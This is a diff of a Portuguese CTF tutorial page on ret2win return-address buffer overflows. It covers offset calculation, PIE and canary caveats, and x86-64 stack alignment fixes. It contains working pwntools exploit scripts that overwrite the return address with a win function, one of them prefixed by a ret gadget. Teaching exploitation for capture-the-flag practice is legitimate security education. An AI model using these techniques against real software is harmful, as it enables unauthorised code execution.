@@ -3,161 +3,109 @@ title: "Buffer Overflow - Return Address"
 sidebar_position: 2
 ---
 
-Na stack, vimos que há um endereço de retorno. Em `x64`, esse endereço de retorno fica em `rbp+0x8`. Em `x86` (32 bits), esse endereço de retorno fica em `ebp+0x4`.
+A instrução `ret` no fim de toda função desempilha o endereço de retorno e o coloca no `rip`. Esse endereço fica na stack, em `rbp+0x8` (x86-64) ou `ebp+0x4` (x86), logo depois das variáveis locais. 
 
-Sempre que uma função chega ao final, ela chama a instrução `ret`, que desempilha esse endereço de retorno, extrai o endereço que está ali guardado, e atribui ao `rip`, de modo que o programa começa a ler instruções a partir daquele endereço.
+Sobrescrevendo-o com um Buffer Overflow, o `ret` leva a execução para onde quisermos, inclusive para funções que o programa nunca chama. O caso em que existe uma função pronta que imprime a flag ou abre uma shell é conhecido como **ret2win**.
 
-Podemos utilizar Buffer Overflow para **sobrescrever esse endereço de retorno e ir para o lugar que quisermos no código**. Sim, podemos chamar qualquer função, mesmo que ela nunca seja chamada no código (ela só precisa existir).
+## Passo a Passo
 
-Para fazer um Buffer Overflow Return Address:
+1. `file` e `pwn checksec`: Ver arquitetura, PIE e canary.
+2. Ache a vulnerabilidade e a posição do buffer (Ghidra ou GDB).
+3. Calcule o offset do início do buffer até o endereço de retorno. Se o buffer está em `rbp-0x20`, são `0x20 + 0x8 = 0x28` bytes. Para não calcular na mão, use uma [sequência de De Bruijn](./debruijn.mdx).
+4. Payload: `padding + endereço`.
 
-1. Verifique informações do arquivo com `file arquivo`
-2. Abra o programa no Ghidra ou Debugger
-3. **Calcule a distância entre o início do input e do endereço de retorno** `rbp+0x8` (x64) ou `ebp+0x4` (x86). Se não quiser calcular na mão, use uma [sequência de De Bruijn](./debruijn.mdx)
-   1. Ex: Se a variável está em `rbp-0x10`, a distância é `0x10 + 0x8 = 0x18`.
-4. Em uma string, coloque caracteres para preencher essa distância. Ao final, **adicione o endereço de algum lugar do programa**.
-
-Para obter endereços, é recomendável **usar o Ghidra para explorar outras funções que podem existir no arquivo** (uma função `win`, `flag`, `shell`, etc). Mas há um porém. Existe uma proteção, ativada por padrão nos compiladores modernos, chamada [PIE](../../protections.mdx#pie-position-independent-executable--aslr-address-space-layout-randomization): com ela, o código do programa é carregado em um endereço base aleatório a cada execução. Assim, o endereço que você viu no Ghidra (algo como `0x1189`) é só um offset, e o endereço real será `base + 0x1189`, com a base mudando toda vez.
-
-Para vencer esse obstáculo, você teria que vazar um endereço do programa (como vimos que pode ser feito tirando o `\0` do fim da string, ou com [Format Strings](../format-strings.md)) e somar o offset.
-
-Nesses desafios, essa proteção está desativada (`pwn checksec` mostra `No PIE`), e você pode apenas copiar e colar os endereços que o Ghidra ou o GDB mostram.
-
-## Cuidado ao sobrescrever Return Address: Desalinhamento de Stack
-
-Existem algumas funções importantes que utilizam instruções que exigem que a Stack esteja alinhada, como, por exemplo, a função `system("/bin/sh")` (e também `printf` com floats, entre outras). Se seu objetivo for chamar uma função que tenha uma dessas dentro, e a stack estiver desalinhada, o programa vai resultar em falha de segmentação.
-
-Para `x64`, a convenção de chamada exige que `rsp` seja múltiplo de `16 bytes` no momento do `call`. Para `x86` de 32 bits, esse problema praticamente não aparece em CTFs.
-
-Em particular, instruções SSE exigem `[rsp] % 16 == 0`
-
-```
-; Instrução SSE
-movaps xmm0, [rsp]    ; ⚠️ CRASH se [rsp] não for múltiplo de 16
-```
-
-Vamos verificar alinhamento de stack para `x64`, onde realmente isso pode causar problemas.
-
-A regra é: **no momento do `call`, `rsp % 16 == 0`**. Como o `call` empilha o endereço de retorno (8 bytes), **toda função começa com `rsp % 16 == 8`**, e o compilador conta com isso: depois do `push rbp` do prólogo, a stack volta a ficar múltipla de 16, e a função gera o resto do código assumindo esse alinhamento.
-
-Fluxo normal (com `call`):
-
-- Antes do `call` - `rsp % 16 == 0` (o compilador garante isso)
-- `call funcao` - `PUSH RIP` (`RSP = RSP - 8`) // `rsp % 16 == 8`
-- `inicio_funcao` - `PUSH RBP` (`RSP = RSP - 8`) // `rsp % 16 == 0` **Alinhado**, como a função espera
-
-Mas quando sobrescrevemos o Return Address, não existe `call`: chegamos na função através do `ret` da função original (`main`). O `ret` **tira** 8 bytes da stack em vez de colocar. Segue o fluxo, lembrando que, antes do `leave`, a stack da `main` estava alinhada (`rbp % 16 == 0`):
-
-- `leave` - `MOV RSP, RBP`; `POP RBP` (`RSP = RSP + 8`) // `rsp % 16 == 8`
-- `ret` - `POP RIP` (`RSP = RSP + 8`) // `rsp % 16 == 0` ← a função é iniciada aqui, mas ela esperava `rsp % 16 == 8`!
-- `inicio_funcao` - `PUSH RBP` (`RSP = RSP - 8`) // `rsp % 16 == 8` **Desalinhado** (a função esperava 0)
-
-Ou seja, entramos na função com a stack deslocada em 8 bytes em relação ao que ela espera. Quando alguma instrução SSE (`movaps`) for executada dentro dela (dentro do `system`, por exemplo), teremos **SIGSEGV (Segmentation Fault)**, e o programa vai crashar.
-
-**Como evitar desalinhamento de stack**? Há duas maneiras.
-
-### 1° - Evitando PUSH RBP
-
-Suponha que a função para a qual queremos pular está em `0x401234`. A instrução `push rbp` ocupa 1 byte de memória (`0x55`). Portanto, para pular para a instrução seguinte (`mov rbp, rsp`), basta usar o endereço `0x401235`. Sem o `push rbp`, a stack entra na função com o alinhamento que ela espera.
+<Mem
+  title="Payload para um buffer em rbp-0x20"
+  top="endereços baixos"
+  bottom="endereços altos"
+  rows={[
+    {addr: 'rbp-0x20', label: "b'A' * 0x20", kind: 'ctrl', h: 2, note: 'buffer'},
+    {addr: 'rbp', label: "b'B' * 8", kind: 'ctrl', note: 'rbp salvo (lixo)'},
+    {addr: 'rbp+0x8', label: 'p64(win)', kind: 'danger', note: 'return address → rip'},
+  ]}
+/>
 
 ```py
-target_address = 0x401234 + 1  # Pula o push rbp
-```
-
-Cuidado: em binários modernos, a primeira instrução da função costuma ser `endbr64` (4 bytes), e só depois vem o `push rbp`. Nesse caso, o endereço seria `0x401234 + 5`. Sempre confira no GDB ou no Ghidra qual é o endereço da instrução logo após o `push rbp`.
-
-### 2° - ROP com ret
-
-Essa técnica é mais confiável e robusta. **[ROP (Return Oriented Programming)](../rop/index.mdx) é uma técnica de exploração que usa pedaços de códigos já existentes no programa (gadgets) para executar código malicioso**. 
-
-Basicamente, vamos **achar o endereço na memória de uma instrução** `ret`, um **gadget**. Isso só é possível diretamente **se a proteção PIE não estiver ativada** (ou se já tivermos vazado a base do binário).
-
-#### Buscando gadget
-
-Podemos usar a ferramenta `ROPgadget` (instale com `pip install ROPgadget`): `ROPgadget --binary meu_programa | grep ": ret$"`. Qualquer `ret` serve, inclusive o `ret` do fim de qualquer função.
-
-Ou podemos usar **pwntools**: 
-
-```py
-from pwn import *
-
-elf = ELF('./vuln')
-rop = ROP(elf)
-
-# Encontra um gadget ret
-ret_gadget = rop.find_gadget(['ret'])
-print(f"Ret gadget: {hex(ret_gadget.address)}") # Imprime endereço do gadget
-# (rop.find_gadget(['ret'])[0] também retorna o endereço)
-```
-
-Assim, podemos montar nosso payload.
-
-Mas, antes de usarmos esse `ret`, vamos entender por que ele funciona.
-
-#### Por que `ret`?
-
-No **fim de uma função qualquer**, sempre teremos as instruções:
-```
-0x0000000000401208 <+124>:   leave
-0x0000000000401209 <+125>:   ret
-```
-
-- `leave` - Comando compacto:
-  - `MOV RSP, RBP` - `RBP` é copiado para `RSP`. Isso destrói o stack frame da função, descartando todas as variáveis locais. (agora, o próximo da stack é o `RBP` antigo)
-  - `POP RBP` - O valor no topo da pilha (`RBP` antigo) é desempilhado para o registrador `RBP`. Isso faz o stack frame "voltar para trás". (agora, o próximo da stack é o `return address`)
-- `ret` - Comando compacto:
-  - `POP RIP` - O valor no topo da pilha (apontado pelo `RSP`) agora é `RBP+8`, o `return address` que tentamos sobrescrever. Como `RIP` é o registrador que indica a instrução atual ativa, estamos fazendo o programa "pular" para um endereço de memória salvo em `RBP+8`.
-
-Esse é o fluxo normal de sair de uma função e voltar para quem a chamou. O efeito que cada `ret` tem é de **tirar 8 bytes da stack** (`RSP = RSP + 8`). E é exatamente isso que precisamos: estávamos 8 bytes "fora" do alinhamento esperado, então um `ret` a mais corrige a conta.
-
-Se sobrescrevemos o `return address` com um endereço de um local do código com `ret`, teremos o seguinte fluxo:
-- `leave` - Comando compacto:
-  - `MOV RSP, RBP` - `RBP` é copiado para `RSP`. Isso destrói o stack frame da função, descartando todas as variáveis locais. (agora, o próximo da stack é o `RBP` antigo)
-  - `POP RBP` - O valor no topo da pilha (`RBP` antigo) é desempilhado para o registrador `RBP`. Isso faz o stack frame "voltar para trás". (agora, o próximo da stack é o `return address`)
-- `ret` - Comando compacto:
-  - `POP RIP` - O valor no topo da pilha (apontado pelo `RSP`) agora é `RBP+0x8`, o `return address` que contém o ROP. Pulamos para um endereço de memória salvo em `RBP+8`.
-- Somos levados a uma instrução `ret` novamente, que interage com a stack.
-- `ret` - Comando compacto:
-  - `POP RIP` - O valor no topo da pilha (apontado pelo `RSP`) agora é `RBP+0x10`, o `return address` que tentamos sobrescrever. Pulamos para um endereço de memória salvo em `RBP+0x10`, que é nossa função.
-
-Assim, teremos a seguinte stack após um overflow:
-```
-[RBP-0x20] = AAAA...          (bytes de padding)
-[RBP+0x00] = RBP antigo        (8 bytes) 
-[RBP+0x08] = RET gadget        ← RIP vai aqui primeiro!
-[RBP+0x10] = Função alvo       ← RIP vai aqui depois!
-```
-
-E, seguindo o `rsp` (lembrando que `rbp % 16 == 0` antes do `leave`):
-
-- `leave` - `MOV RSP, RBP`; `POP RBP` (`RSP = RSP + 8`) // `rsp % 16 == 8`
-- `ret` - `POP RIP` (`RSP = RSP + 8`) // `rsp % 16 == 0`. Vai para o gadget `ret`
-- `ret` (gadget) - `POP RIP` (`RSP = RSP + 8`) // `rsp % 16 == 8`. Vai para a função alvo
-- `inicio_funcao` - `PUSH RBP` (`RSP = RSP - 8`) // `rsp % 16 == 0` **Alinhado**
-
-Veja, agora a função começa com `rsp % 16 == 8`, exatamente como se tivesse sido chamada com `call`.
-
-#### Código em pwntools
-
-```py
-
 from pwn import *
 
 elf = context.binary = ELF('./vuln')
 p = process()
 
-# Acha gadget
-rop = ROP(elf)
-ret = rop.find_gadget(['ret'])[0]   # endereço do gadget
-func_addr = elf.sym['win']          # função alvo (pelo nome, se o binário não for stripped)
+payload = b'A' * 0x28 + p64(elf.sym['win'])
+p.sendline(payload)
+p.interactive()
+```
 
-# Alinha com ret e entra na função
-payload = b'A' * 40        # padding até o return address (buffer + rbp salvo)
-payload += p64(ret)
-payload += p64(func_addr)
+### Como conseguir o endereço de destino
+
+- **Sem PIE** (`No PIE` no checksec): os endereços do binário são fixos. Use o que o Ghidra/GDB mostra, ou `elf.sym['win']`.
+- **Com [PIE](../../protections.mdx#pie-position-independent-executable--aslr-address-space-layout-randomization)**: o que você vê no Ghidra (`0x1189`) é só um offset. É preciso vazar um endereço do binário, calcular a base e somar (`elf.address = leak - offset`; depois `elf.sym['win']` já vem corrigido), ou fazer um [Partial Overwrite](../rop/partial-overwrite.mdx).
+- **Com canary**: O canary precisa ser vazado e recolocado na posição dele (veja [Proteções](../../protections.mdx#stack-canaryssp-stack-smashing-protector)).
+
+## Alinhamento da stack {#cuidado-ao-sobrescrever-return-address-desalinhamento-de-stack}
+
+Existe um problema comum ao fazer BOF - Return Address: o exploit chega na função certa, mas o programa morre com `SIGSEGV` dentro de `system`, `printf` ou `puts`, em uma instrução como `movaps XMMWORD PTR [rsp+0x50], xmm0`.
+
+A ABI de x86-64 exige `rsp` múltiplo de 16 **no momento do `call`**. Como o `call` empilha 8 bytes, toda função começa com `rsp % 16 == 8`, e o compilador gera código contando com isso. Instruções SSE como `movaps` exigem operandos de memória alinhados em 16 e falham se a conta não fechar.
+
+Quando chegamos a uma função por `ret` em vez de `call` (por meio de Buffer Overflow), ninguém empilhou o endereço de retorno, e a função começa com a stack 8 bytes fora do que espera:
+
+| | Chegada por `call` (normal) | Chegada por `ret` (exploit) |
+|---|---|---|
+| Antes | `rsp % 16 == 0` | `rsp % 16 == 8` (apontando para o return address) |
+| Instrução | `call` empilha 8 bytes | `ret` desempilha 8 bytes |
+| Entrada da função | `rsp % 16 == 8` ✅ | `rsp % 16 == 0` ❌ |
+
+Em 32 bits isso também pode ocorrer, mas é mais difícil.
+
+Para corrigir essa falha é simples. Existem dois modos de correção.
+
+### Correção 1: um gadget `ret` antes
+
+Executar um `ret` a mais desempilha mais 8 bytes e devolve o alinhamento esperado. 
+
+Basta colocar o endereço de qualquer instrução `ret` do binário antes do endereço da função. Ele vai simplesmente consumir o endereço atual (decrescentando rsp) e pular para o próximo.
+
+<Mem
+  title="Com o gadget ret, a função alvo começa com rsp % 16 == 8"
+  top="endereços baixos"
+  bottom="endereços altos"
+  rows={[
+    {label: 'padding', kind: 'ctrl', h: 1.4},
+    {addr: 'rbp+0x8', label: 'endereço de um ret', kind: 'meta', note: '1º ret: pula para o gadget'},
+    {addr: 'rbp+0x10', label: 'endereço de win', kind: 'danger', note: '2º ret (o do gadget): pula para win'},
+  ]}
+/>
+
+```py
+from pwn import *
+
+elf = context.binary = ELF('./vuln')
+p = process()
+
+rop = ROP(elf)
+ret = rop.find_gadget(['ret'])[0]      # endereço de um "ret" qualquer
+
+payload  = b'A' * 0x28
+payload += p64(ret)                    # alinha a stack
+payload += p64(elf.sym['win'])
 
 p.sendline(payload)
 p.interactive()
 ```
 
-Dica: se o exploit funciona "na teoria" mas dá `SIGSEGV` dentro de `system`/`printf`, o problema quase sempre é alinhamento. Adicionar (ou remover) um `ret` no início da chain resolve.
+Pelo obter endereços de [ROP](../rop/index.mdx) pelo terminal, use `ROPgadget`: `ROPgadget --binary ./vuln | grep ": ret$"`.
+
+### Correção 2: pular o `push rbp`
+
+Entrar na função apenas uma instrução depois do `push rbp` tem o mesmo efeito (um `push` a menos equivale a 8 bytes de diferença):
+
+```py
+target = elf.sym['win'] + 1    # push rbp tem 1 byte (0x55)
+```
+
+Em binários modernos a função começa com `endbr64` (4 bytes) e só depois vem o `push rbp`, então o salto é `+5`. Confira no disassembly o endereço da instrução logo após o `push rbp`.
+
+:::tip
+Se o exploit "deveria funcionar" e dá `SIGSEGV` dentro de uma função da libc, teste adicionar ou remover um `ret` antes de qualquer outra investigação.
+:::
